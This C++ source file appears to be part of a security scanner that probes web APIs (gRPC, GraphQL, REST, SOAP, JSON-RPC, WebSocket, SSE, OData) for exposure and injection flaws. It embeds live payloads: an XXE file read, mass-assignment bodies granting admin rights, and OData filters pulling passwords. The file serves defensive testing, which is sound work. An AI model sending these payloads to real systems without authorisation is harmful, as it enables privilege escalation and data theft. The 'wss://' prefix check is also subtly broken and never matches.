/// @file scanners/api_protocols.cpp
/// @brief API protocol scanners: gRPC reflection, GraphQL subscription abuse,
///        REST mass assignment, SOAP injection, JSON-RPC method enumeration,
///        WebSocket message tampering, Server-Sent Events data leak, OData injection.
#include "scanner_base.hpp"
#include <regex>
#include <set>

namespace apex {
namespace {

/// gRPC reflection — check for grpc-status header and test reflection endpoint.
std::vector<Finding> scan_grpc_reflection(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> grpc_paths = {
      "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
      "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
      "/grpc.health.v1.Health/Check"};

  for (const auto &path : grpc_paths) {
    auto resp = http.post(base + path, "", "application/grpc");
    bool has_grpc_header = resp.headers.find("grpc-status") != resp.headers.end();
    if (has_grpc_header || resp.status_code == 200) {
      std::string grpc_status = has_grpc_header ? resp.headers.at("grpc-status") : "n/a";
      if (grpc_status == "0" || grpc_status == "12" || resp.status_code == 200) {
        findings.push_back({"gRPC Reflection Exposed", "high", base + path,
                            "gRPC reflection service accessible — all service/method names leaked",
                            "", path,
                            "grpc-status: " + grpc_status});
        break;
      }
    }
  }

  // Also probe for gRPC-Web endpoints
  auto resp = http.post(base + "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
                        "", "application/grpc-web+proto");
  if (resp.status_code == 200 && resp.body.size() > 0) {
    findings.push_back({"gRPC-Web Reflection", "medium", base,
                        "gRPC-Web reflection endpoint responds — service enumeration possible",
                        "", "grpc-web+proto", ""});
  }
  return findings;
}

/// GraphQL subscription abuse — WebSocket hijack via subscriptions.
std::vector<Finding> scan_graphql_subscription_abuse(const Config &, HttpClient &http,
                                                     const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> gql_paths = {"/graphql", "/api/graphql", "/v1/graphql",
                                               "/subscriptions", "/graphql/subscriptions"};

  for (const auto &path : gql_paths) {
    // Test if subscriptions are enabled by sending introspection for subscription type
    std::string introspect_query =
        R"({"query":"{ __schema { subscriptionType { name fields { name } } } }"})";
    auto resp = http.post(base + path, introspect_query, "application/json");

    if (resp.status_code == 200 &&
        resp.body.find("subscriptionType") != std::string::npos &&
        resp.body.find("null") == std::string::npos) {
      findings.push_back({"GraphQL Subscription Exposed", "high", base + path,
                          "GraphQL subscriptions available — potential WebSocket hijack "
                          "for real-time data exfiltration",
                          "", "subscriptionType introspection",
                          resp.body.substr(0, 200)});

      // Attempt unauthenticated subscription connection
      auto ws_resp = http.get(base + path, {{"Upgrade", "websocket"},
                                             {"Connection", "Upgrade"},
                                             {"Sec-WebSocket-Protocol", "graphql-ws"}});
      if (ws_resp.status_code == 101 || ws_resp.status_code == 200) {
        findings.push_back({"GraphQL WebSocket Hijack", "critical", base + path,
                            "Unauthenticated WebSocket upgrade accepted for GraphQL subscriptions",
                            "", "graphql-ws protocol", ""});
      }
      break;
    }
  }
  return findings;
}

/// REST mass assignment — add extra fields to PUT/PATCH requests.
std::vector<Finding> scan_rest_mass_assignment(const Config &, HttpClient &http,
                                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> api_paths = {"/api/user", "/api/users/me", "/api/profile",
                                               "/api/v1/user", "/api/account"};
  const std::vector<std::string> dangerous_fields = {
      "\"role\":\"admin\"", "\"is_admin\":true", "\"isAdmin\":true",
      "\"permissions\":[\"*\"]", "\"verified\":true", "\"balance\":99999"};

  for (const auto &path : api_paths) {
    auto get_resp = http.get(base + path);
    if (get_resp.status_code != 200) continue;

    for (const auto &field : dangerous_fields) {
      std::string payload = "{" + field + ",\"name\":\"test\"}";
      auto patch_resp = http.post(base + path, payload, "application/json",
                                  {{"X-HTTP-Method-Override", "PATCH"}});

      if (patch_resp.status_code == 200 || patch_resp.status_code == 204) {
        // Verify field was accepted (no error about unknown fields)
        if (patch_resp.body.find("error") == std::string::npos &&
            patch_resp.body.find("unknown") == std::string::npos &&
            patch_resp.body.find("not allowed") == std::string::npos) {
          std::string evidence = "HTTP " + std::to_string(patch_resp.status_code);
          findings.push_back({"REST Mass Assignment", "critical", base + path,
                              "API accepts privileged fields in PATCH request — "
                              "potential privilege escalation",
                              "", field, evidence});
          return findings;
        }
      }
    }
  }
  return findings;
}

/// SOAP injection — test WSDL exposure and XML entity injection in SOAP body.
std::vector<Finding> scan_soap_injection(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> wsdl_paths = {
      "/ws?wsdl", "/service?wsdl", "/soap?wsdl", "/api/soap?wsdl",
      "/services?wsdl", "/webservice?wsdl", "/?wsdl"};

  for (const auto &path : wsdl_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 &&
        (resp.body.find("<wsdl:") != std::string::npos ||
         resp.body.find("<definitions") != std::string::npos)) {
      findings.push_back({"WSDL Exposed", "medium", base + path,
                          "SOAP WSDL publicly accessible — all operations and types disclosed",
                          "", "?wsdl", resp.body.substr(0, 150)});

      // Attempt XXE in SOAP body
      std::string xxe_soap =
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
          "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n"
          "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n"
          "  <soapenv:Body><test>&xxe;</test></soapenv:Body>\n"
          "</soapenv:Envelope>";
      auto xxe_resp = http.post(base + path, xxe_soap, "text/xml");

      if (xxe_resp.status_code == 200 &&
          xxe_resp.body.find("<!ENTITY") == std::string::npos &&
          xxe_resp.body.size() > 100) {
        // Check if entity was resolved (response differs from typical error)
        if (xxe_resp.body.find("fault") == std::string::npos) {
          findings.push_back({"SOAP XXE Injection", "critical", base + path,
                              "SOAP endpoint processes external XML entities — "
                              "potential file read or SSRF",
                              "", "DOCTYPE entity injection",
                              xxe_resp.body.substr(0, 200)});
        }
      }
      break;
    }
  }
  return findings;
}

/// JSON-RPC method enumeration.
std::vector<Finding> scan_jsonrpc_enumeration(const Config &, HttpClient &http,
                                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> rpc_paths = {"/jsonrpc", "/rpc", "/api/rpc",
                                               "/json-rpc", "/api/jsonrpc"};
  const std::vector<std::string> probe_methods = {
      "system.listMethods", "rpc.discover", "system.methodHelp",
      "system.methodSignature", "debug.trace", "admin.peers",
      "eth_accounts", "personal_listAccounts"};

  for (const auto &path : rpc_paths) {
    // First test if JSON-RPC endpoint exists
    std::string discovery =
        R"({"jsonrpc":"2.0","method":"system.listMethods","id":1})";
    auto resp = http.post(base + path, discovery, "application/json");

    if (resp.status_code != 200) continue;
    if (resp.body.find("jsonrpc") == std::string::npos) continue;

    // Endpoint confirmed — check if method listing works
    if (resp.body.find("result") != std::string::npos &&
        resp.body.find("error") == std::string::npos) {
      findings.push_back({"JSON-RPC Method Listing", "high", base + path,
                          "JSON-RPC system.listMethods accessible — full API surface exposed",
                          "", "system.listMethods",
                          resp.body.substr(0, 200)});
      return findings;
    }

    // Enumerate sensitive methods
    for (const auto &method : probe_methods) {
      std::string payload =
          R"({"jsonrpc":"2.0","method":")" + method + R"(","params":[],"id":1})";
      auto m_resp = http.post(base + path, payload, "application/json");
      if (m_resp.status_code == 200 &&
          m_resp.body.find("result") != std::string::npos &&
          m_resp.body.find("Method not found") == std::string::npos) {
        findings.push_back({"JSON-RPC Sensitive Method", "high", base + path,
                            "Sensitive JSON-RPC method accessible: " + method,
                            "", method,
                            m_resp.body.substr(0, 150)});
        return findings;
      }
    }
  }
  return findings;
}

/// WebSocket message tampering — find ws:// URLs, test auth bypass.
std::vector<Finding> scan_websocket_tampering(const Config &, HttpClient &http,
                                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  std::regex ws_re(R"(wss?://[^\s\"'<>]+)");
  std::set<std::string> ws_urls;

  for (const auto &url : crawl.urls) {
    auto resp = http.get(url);
    std::sregex_iterator it(resp.body.begin(), resp.body.end(), ws_re);
    std::sregex_iterator end;
    for (; it != end; ++it) {
      ws_urls.insert(it->str());
    }
  }

  for (const auto &ws_url : ws_urls) {
    // Convert ws:// to http:// for upgrade test
    std::string http_url = ws_url;
    if (http_url.substr(0, 5) == "wss://")
      http_url = "https://" + http_url.substr(6);
    else if (http_url.substr(0, 5) == "ws://")
      http_url = "http://" + http_url.substr(5);

    // Test WebSocket upgrade without auth
    auto resp = http.get(http_url, {{"Upgrade", "websocket"},
                                     {"Connection", "Upgrade"},
                                     {"Sec-WebSocket-Version", "13"},
                                     {"Sec-WebSocket-Key", "dGVzdA=="}});
    if (resp.status_code == 101) {
      findings.push_back({"WebSocket Auth Bypass", "high", ws_url,
                          "WebSocket endpoint accepts upgrade without authentication",
                          "", "No-auth upgrade accepted",
                          "HTTP 101 Switching Protocols"});
      break;
    }

    // Check for unencrypted WebSocket (ws:// instead of wss://)
    if (ws_url.substr(0, 5) == "ws://") {
      findings.push_back({"Unencrypted WebSocket", "medium", ws_url,
                          "WebSocket connection uses unencrypted ws:// — "
                          "messages susceptible to interception and tampering",
                          "", "ws:// protocol", ""});
      break;
    }
  }
  return findings;
}

/// Server-Sent Events data leak — find /events or /stream endpoints.
std::vector<Finding> scan_sse_data_leak(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> sse_paths = {
      "/events", "/stream", "/api/events", "/api/stream",
      "/sse", "/api/sse", "/realtime", "/api/realtime",
      "/notifications/stream", "/updates"};
  const std::vector<std::string> sensitive_patterns = {
      "password", "token", "secret", "private", "internal",
      "admin", "session", "credit", "ssn", "email"};

  for (const auto &path : sse_paths) {
    auto resp = http.get(base + path, {{"Accept", "text/event-stream"}});
    if (resp.status_code != 200) continue;

    bool is_sse = resp.headers.find("content-type") != resp.headers.end() &&
                  resp.headers.at("content-type").find("text/event-stream") != std::string::npos;
    bool has_sse_format = resp.body.find("data:") != std::string::npos ||
                          resp.body.find("event:") != std::string::npos;

    if (is_sse || has_sse_format) {
      // Check for sensitive data in stream
      for (const auto &pattern : sensitive_patterns) {
        if (resp.body.find(pattern) != std::string::npos) {
          findings.push_back({"SSE Sensitive Data Leak", "high", base + path,
                              "Server-Sent Events stream exposes sensitive data: " + pattern,
                              "", "text/event-stream",
                              resp.body.substr(0, 200)});
          return findings;
        }
      }

      // Even without sensitive data, unauthenticated SSE is noteworthy
      findings.push_back({"SSE Endpoint Open", "low", base + path,
                          "Server-Sent Events endpoint accessible without authentication",
                          "", "text/event-stream", ""});
      return findings;
    }
  }
  return findings;
}

/// OData injection — $filter parameter manipulation.
std::vector<Finding> scan_odata_injection(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  std::string base = base_url_from(crawl.urls[0]);
  const std::vector<std::string> odata_paths = {
      "/odata", "/api/odata", "/v1/odata", "/api/v1",
      "/api/v2", "/api/entities", "/api/data"};

  for (const auto &path : odata_paths) {
    // Check for OData metadata endpoint
    auto meta_resp = http.get(base + path + "/$metadata");
    bool is_odata = (meta_resp.status_code == 200 &&
                     (meta_resp.body.find("edmx") != std::string::npos ||
                      meta_resp.body.find("EntityType") != std::string::npos));

    if (!is_odata) {
      // Try basic OData query to confirm
      auto probe = http.get(base + path + "?$top=1");
      if (probe.status_code != 200 ||
          probe.body.find("value") == std::string::npos)
        continue;
    }

    // Test $filter injection for auth bypass
    const std::vector<std::string> filter_payloads = {
        "?$filter=1 eq 1",
        "?$filter=IsAdmin eq true",
        "?$filter=Role eq 'admin'",
        "?$filter=Password ne null&$select=Password,Username",
        "?$filter=true&$expand=Credentials"};

    for (const auto &filter : filter_payloads) {
      auto resp = http.get(base + path + filter);
      if (resp.status_code == 200 &&
          resp.body.find("error") == std::string::npos &&
          resp.body.find("value") != std::string::npos &&
          resp.body.size() > 50) {
        findings.push_back({"OData Filter Injection", "high", base + path + filter,
                            "OData $filter accepts dangerous queries — "
                            "potential data exfiltration or auth bypass",
                            "", filter,
                            resp.body.substr(0, 200)});
        return findings;
      }
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_api_protocol_scanners() {
  return {
      {"gRPC Reflection", scan_grpc_reflection},
      {"GraphQL Subscription Abuse", scan_graphql_subscription_abuse},
      {"REST Mass Assignment", scan_rest_mass_assignment},
      {"SOAP Injection", scan_soap_injection},
      {"JSON-RPC Enumeration", scan_jsonrpc_enumeration},
      {"WebSocket Tampering", scan_websocket_tampering},
      {"SSE Data Leak", scan_sse_data_leak},
      {"OData Injection", scan_odata_injection},
  };
}

} // namespace apex
